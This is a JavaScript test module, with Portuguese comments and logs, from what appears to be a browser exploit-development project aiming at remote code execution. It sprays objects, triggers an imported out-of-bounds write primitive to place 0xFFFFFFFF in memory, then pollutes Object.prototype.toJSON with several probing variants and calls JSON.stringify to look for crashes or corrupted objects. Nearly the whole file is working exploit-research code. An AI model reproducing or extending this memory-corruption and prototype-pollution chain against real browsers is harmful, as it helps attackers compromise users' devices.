// js/script3/testInvestigateForInRCE.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject { // Mesma classe dos testes anteriores
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean";
    }

    checkIntegrity(loggerFunc = logS3) {
        let checkOk = true;
        const currentId = this.id || "ID_DESCONHECIDO";
        if (this.marker !== 0xCAFECAFE) {
            if(loggerFunc) loggerFunc(`!! ${currentId} - FALHA INTEGRIDADE! Marcador: ${toHex(this.marker)}`, 'critical', 'checkIntegrity');
            checkOk = false;
        }
        // Adicione mais checagens se outros campos forem modificados
        return checkOk;
    }
    action() { return `ID:${this.id} acted`; }
}

// --- Variantes da toJSON para investigar o for...in ---

// V0: Apenas o loop for...in, sem operações dentro, apenas contando.
export function toJSON_ForIn_V0_LoopOnly() {
    const FNAME_toJSON = "toJSON_ForIn_V0_LoopOnly";
    let iteration_count = 0;
    let error_in_loop = null;
    try {
        for (const prop in this) {
            iteration_count++;
            if (iteration_count > 10000) { // Safety break para loops muito longos
                logS3(`[${FNAME_toJSON}] Loop for...in V0 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e) {
        error_in_loop = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V0: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        error: error_in_loop
    };
}

// V1: Loop for...in + Object.prototype.hasOwnProperty.call(this, prop)
export function toJSON_ForIn_V1_LoopAndHasOwnProperty() {
    const FNAME_toJSON = "toJSON_ForIn_V1_LoopAndHasOwnProperty";
    let iteration_count = 0;
    let properties_owned_count = 0;
    let error_in_loop = null;
    try {
        for (const prop in this) {
            iteration_count++;
            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                properties_owned_count++;
            }
            if (iteration_count > 10000) {
                logS3(`[${FNAME_toJSON}] Loop for...in V1 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e) {
        error_in_loop = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V1: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        owned_props_counted: properties_owned_count,
        error: error_in_loop
    };
}

// V2: Loop for...in + hasOwnProperty + Acesso a this[prop] (sem atribuição ou conversão complexa)
export function toJSON_ForIn_V2_LoopAndAccess() {
    const FNAME_toJSON = "toJSON_ForIn_V2_LoopAndAccess";
    let iteration_count = 0;
    let last_accessed_prop_val = "N/A";
    let error_in_loop = null;
    try {
        for (const prop in this) {
            iteration_count++;
            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                last_accessed_prop_val = this[prop]; // Apenas acessa
            }
            if (iteration_count > 10000) {
                logS3(`[${FNAME_toJSON}] Loop for...in V2 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e) {
        error_in_loop = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V2: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        // Não logamos last_accessed_prop_val para evitar complexidade no stringifyResult se for um objeto
        error: error_in_loop
    };
}

// V3: Loop for...in + hasOwnProperty + Acesso this[prop] + String(this[prop])
export function toJSON_ForIn_V3_LoopAccessAndString() {
    const FNAME_toJSON = "toJSON_ForIn_V3_LoopAccessAndString";
    let iteration_count = 0;
    let last_prop_as_string = "N/A";
    let error_in_loop = null;
    try {
        for (const prop in this) {
            iteration_count++;
            if (Object.prototype.hasOwnProperty.call(this, prop)) {
                if (typeof this[prop] !== 'function') { // Evitar chamar funções
                    last_prop_as_string = String(this[prop]).substring(0, 30);
                }
            }
            if (iteration_count > 10000) {
                logS3(`[${FNAME_toJSON}] Loop for...in V3 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
                break;
            }
        }
    } catch (e) {
        error_in_loop = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V3: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        last_prop_str_sample: last_prop_as_string,
        error: error_in_loop
    };
}

// V4: Próximo da toJSON_ProbeGenericObject original que causou RangeError
export function toJSON_ForIn_V4_OriginalAttempt() {
    const FNAME_toJSON = "toJSON_ForIn_V4_OriginalAttempt";
    let iteration_count = 0;
    let error_in_loop = null;
    let props_payload = {};
    try {
        if (typeof this === 'object' && this !== null) {
            for (const prop in this) {
                iteration_count++;
                if (Object.prototype.hasOwnProperty.call(this, prop)) {
                    // Apenas para propriedades específicas, como na original
                    if (['id', 'value1', 'value2', 'marker', 'anotherProperty'].includes(prop) && typeof this[prop] !== 'function') {
                        props_payload[prop] = String(this[prop]).substring(0, 50);
                    }
                }
                if (iteration_count > 10000) {
                     logS3(`[${FNAME_toJSON}] Loop for...in V4 excedeu 10000 iterações. Interrompendo. ID: ${this.id}`, "warn", FNAME_toJSON);
                    break;
                }
            }
        }
    } catch (e) {
        error_in_loop = `${e.name}: ${e.message}`;
        logS3(`[${FNAME_toJSON}] ERRO DENTRO DO LOOP V4: ${error_in_loop} ID: ${this.id}`, "error", FNAME_toJSON);
    }
    return {
        toJSON_variant: FNAME_toJSON,
        id: (this && this.id !== undefined ? String(this.id).substring(0,20) : "N/A"),
        iterations: iteration_count,
        props: props_payload,
        error: error_in_loop
    };
}


export async function executeInvestigateForInRCETest(toJSONFunctionToUse, toJSONFunctionName) {
    const FNAME_TEST = `executeInvestigateForInRCE<${toJSONFunctionName}>`;
    logS3(`--- Iniciando Sub-Teste: Investigando for...in com ${toJSONFunctionName} ---`, "subtest", FNAME_TEST);
    document.title = `Investiga ForIn - ${toJSONFunctionName}`;

    const spray_count = 50; // Reduzido para focar no primeiro objeto
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return { setupError: e_spray };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return { setupError: new Error("OOB Setup Failed")};
    }
    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: e_write };
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro objeto pulverizado (sprayed_objects[0]) com ${toJSONFunctionName}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let pollutionApplied = false;
    let result = {
        targetObjectId: null,
        integrityBefore: null,
        stringifyError: null,
        toJSONReturn: null,
        integrityAfter: null,
    };

    const target_obj = sprayed_objects[0];
    if (!target_obj) {
        logS3("ERRO: Nenhum objeto pulverizado para testar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return { setupError: new Error("No sprayed objects") };
    }
    result.targetObjectId = target_obj.id;

    try {
        result.integrityBefore = target_obj.checkIntegrity(logS3);
        logS3(`   Integridade de ${target_obj.id} ANTES de JSON.stringify: ${result.integrityBefore}`, result.integrityBefore ? "good" : "warn", FNAME_TEST);

        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSONFunctionToUse,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;

        logS3(`   Chamando JSON.stringify(${target_obj.id}) usando ${toJSONFunctionName}...`, 'info', FNAME_TEST);
        document.title = `Stringify ${target_obj.id} - ${toJSONFunctionName}`;
        try {
            result.toJSONReturn = JSON.stringify(target_obj);
            logS3(`     JSON.stringify(${target_obj.id}) completou. Retorno da toJSON: ${JSON.stringify(result.toJSONReturn)}`, "info", FNAME_TEST);
            if (result.toJSONReturn && result.toJSONReturn.error) {
                 logS3(`     ERRO INTERNO na ${toJSONFunctionName}: ${result.toJSONReturn.error}`, "warn", FNAME_TEST);
                 result.stringifyError = { name: "InternalToJSONError", message: result.toJSONReturn.error };
            }
        } catch (e_str) {
            result.stringifyError = { name: e_str.name, message: e_str.message };
            logS3(`     !!!! ERRO AO STRINGIFY ${target_obj.id} !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error");
        }

        result.integrityAfter = target_obj.checkIntegrity(logS3);
        logS3(`   Integridade de ${target_obj.id} APÓS JSON.stringify: ${result.integrityAfter}`, result.integrityAfter ? "good" : "warn", FNAME_TEST);


    } catch (e_main_test_logic) {
        logS3(`Erro na lógica principal do teste para ${target_obj.id}: ${e_main_test_logic.message}`, "error", FNAME_TEST);
        result.stringifyError = { name: "MainTestLogicError", message: e_main_test_logic.message };
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (result.stringifyError && result.stringifyError.name === 'RangeError') {
        logS3(`   ---> RangeError: Maximum call stack size exceeded OCORREU com ${toJSONFunctionName} para ${target_obj.id}!`, "vuln", FNAME_TEST);
        document.title = `RangeError with ${toJSONFunctionName} on ${target_obj.id}!`;
    } else if (result.stringifyError) {
        logS3(`   Outro erro (${result.stringifyError.name}) ocorreu com ${toJSONFunctionName} para ${target_obj.id}.`, "error", FNAME_TEST);
    } else if (!result.integrityBefore || !result.integrityAfter) {
        logS3(`   Falha de integridade detectada para ${target_obj.id} com ${toJSONFunctionName}.`, "warn", FNAME_TEST);
    } else {
        logS3(`   ${toJSONFunctionName} para ${target_obj.id} completou sem RangeError ou falha de integridade óbvia.`, "good", FNAME_TEST);
    }

    logS3(`--- Sub-Teste com ${toJSONFunctionName} CONCLUÍDO ---`, "subtest", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    return result;
}
